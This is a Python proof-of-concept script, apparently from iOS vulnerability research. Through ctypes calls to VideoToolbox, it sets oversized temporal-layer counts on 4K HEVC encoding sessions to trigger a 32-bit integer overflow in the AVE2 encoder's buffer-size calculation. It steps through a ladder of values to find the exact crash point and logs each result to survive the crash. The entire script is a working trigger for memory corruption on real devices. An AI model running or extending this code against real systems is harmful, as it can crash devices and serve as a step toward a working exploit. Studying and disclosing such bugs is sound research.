"""
AVE2 NTL overflow PoC — incremental-output version (v2)
Writes results to AppGroup file so partial output survives a hard crash.

Root cause: 26.6.1 computes DPB buffer size as (DPB_unit × NTL) in 32-bit.
4K HEVC: DPB_unit ≈ 2,088,960 bytes → overflow at NTL ≥ 2056.

Previous run: broad ladder [1..16462], crashed at 151s.
Crash window: NTL 2056–4096 (15 probes × ~10s/probe).
This run: targeted binary-search ladder inside that window.

Usage: run via offload_python MCP on iPhone 26.6.1.
AppGroup UUID: 92767569-346F-4ECE-B7F6-8107C7A21B5B
Log file: AppGroup/Library/ave2_ntl_probe.txt
"""
import ctypes as C, sys, os, time

APPGROUP = (
    "/private/var/mobile/Containers/Shared/AppGroup"
    "/92767569-346F-4ECE-B7F6-8107C7A21B5B/Library"
)
LOG_FILE = f"{APPGROUP}/ave2_ntl_probe.txt"

def log(msg):
    ts = time.strftime("%H:%M:%S")
    line = f"[{ts}] {msg}\n"
    sys.stdout.write(line)
    sys.stdout.flush()
    try:
        with open(LOG_FILE, "a") as f:
            f.write(line)
            f.flush()
            os.fsync(f.fileno())
    except Exception as exc:
        sys.stdout.write(f"[LOG_ERR] {exc}\n")
        sys.stdout.flush()


CF = C.CDLL("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation")
VT = C.CDLL("/System/Library/Frameworks/VideoToolbox.framework/VideoToolbox")
CV = C.CDLL("/System/Library/Frameworks/CoreVideo.framework/CoreVideo")

CF.CFNumberCreate.restype = C.c_void_p
CF.CFNumberCreate.argtypes = [C.c_void_p, C.c_int, C.c_void_p]
CF.CFRelease.argtypes = [C.c_void_p]
kCFNumberSInt32Type = 3

def cf_num(v):
    n = C.c_int32(v)
    return CF.CFNumberCreate(None, kCFNumberSInt32Type, C.byref(n))

VT.VTCompressionSessionCreate.restype = C.c_int32
VT.VTCompressionSessionCreate.argtypes = [
    C.c_void_p, C.c_int32, C.c_int32, C.c_uint32,
    C.c_void_p, C.c_void_p, C.c_void_p, C.c_void_p, C.c_void_p,
    C.POINTER(C.c_void_p),
]
VT.VTSessionSetProperty.restype = C.c_int32
VT.VTSessionSetProperty.argtypes = [C.c_void_p, C.c_void_p, C.c_void_p]
VT.VTCompressionSessionInvalidate.argtypes = [C.c_void_p]

class CMTime(C.Structure):
    _fields_ = [("value", C.c_int64), ("timescale", C.c_int32),
                ("flags", C.c_uint32), ("epoch", C.c_int64)]

VT.VTCompressionSessionEncodeFrame.restype = C.c_int32
VT.VTCompressionSessionEncodeFrame.argtypes = [
    C.c_void_p, C.c_void_p, CMTime, CMTime, C.c_void_p, C.c_void_p,
    C.POINTER(C.c_uint32),
]

CV.CVPixelBufferCreate.restype = C.c_int32
CV.CVPixelBufferCreate.argtypes = [
    C.c_void_p, C.c_ulong, C.c_ulong, C.c_uint32, C.c_void_p,
    C.POINTER(C.c_void_p),
]
CV.CVPixelBufferRelease.argtypes = [C.c_void_p]

kHEVC = 0x68766331  # 'hvc1'
kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange = 0x34323076

CALLBACK_TYPE = C.CFUNCTYPE(None, C.c_void_p, C.c_void_p, C.c_int32, C.c_void_p, C.c_void_p)
@CALLBACK_TYPE
def output_cb(*a): pass

WIDTH, HEIGHT = 3840, 2160  # 4K

CTU_W = (WIDTH + 63) // 64
CTU_H = (HEIGHT + 63) // 64
DPB_UNIT = CTU_W * CTU_H * 1024
OVERFLOW_NTL = (1 << 32) // DPB_UNIT


def probe_ntl(ntl):
    """Test one NTL value. Returns: string result."""
    product_64 = DPB_UNIT * ntl
    product_32 = product_64 & 0xFFFFFFFF
    overflow = product_64 >= (1 << 32)

    sess = C.c_void_p(0)
    st = VT.VTCompressionSessionCreate(
        None, WIDTH, HEIGHT, kHEVC, None, None, None, output_cb, None, C.byref(sess)
    )
    if st != 0 or not sess.value:
        return f"session_fail({st:#x})"

    ntl_key = C.c_void_p.in_dll(VT, "kVTCompressionPropertyKey_NumberOfTemporalLayers").value
    ntl_val = cf_num(ntl)
    st2 = VT.VTSessionSetProperty(sess.value, ntl_key, ntl_val)
    CF.CFRelease(ntl_val)
    if st2 != 0:
        VT.VTCompressionSessionInvalidate(sess.value)
        return f"ntl_rejected({st2:#x})"

    pbuf = C.c_void_p(0)
    st3 = CV.CVPixelBufferCreate(
        None, WIDTH, HEIGHT,
        kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
        None, C.byref(pbuf),
    )
    if st3 != 0 or not pbuf.value:
        VT.VTCompressionSessionInvalidate(sess.value)
        return f"pixbuf_fail({st3:#x})"

    pts = CMTime(value=0, timescale=90000, flags=1, epoch=0)
    dur = CMTime(value=3000, timescale=90000, flags=1, epoch=0)
    info = C.c_uint32(0)
    st4 = VT.VTCompressionSessionEncodeFrame(
        sess.value, pbuf.value, pts, dur, None, None, C.byref(info)
    )
    CV.CVPixelBufferRelease(pbuf.value)
    VT.VTCompressionSessionInvalidate(sess.value)

    ovf_str = f"OVERFLOW→{product_32:#010x}" if overflow else f"no_overflow({product_64:#x})"
    return f"encode_st={st4:#x} {ovf_str}"


# Header
log(f"=== AVE2 NTL probe v2 — {WIDTH}x{HEIGHT} ===")
log(f"DPB_unit={DPB_UNIT}  overflow_threshold=NTL>={OVERFLOW_NTL}")
log(f"Log: {LOG_FILE}")
log("---")

# Ladder:
#   First confirm the safe baseline and the first overflow value survive.
#   Then binary-search 2056–4096 to pin the exact crash NTL.
#   Write "STARTING" BEFORE the call so the last line in the log tells us
#   which probe killed the process.
LADDER = [
    1,     # sanity: no overflow, should be encode_st=0
    2000,  # just below threshold: no overflow
    2056,  # first overflow NTL — may or may not crash depending on trigger
    2200,
    2500,
    3000,
    3500,
    4096,
    # extended range only if we survive 4096:
    6000,
    8192,
    12000,
    16000,
    16462,
]

for ntl in LADDER:
    # Log STARTING first — if the next line never appears, this NTL killed us
    log(f"NTL={ntl:6d}: STARTING  (overflow={'YES' if DPB_UNIT*ntl>=(1<<32) else 'NO'})")
    result = probe_ntl(ntl)
    log(f"NTL={ntl:6d}: {result}")

log("=== DONE ===")
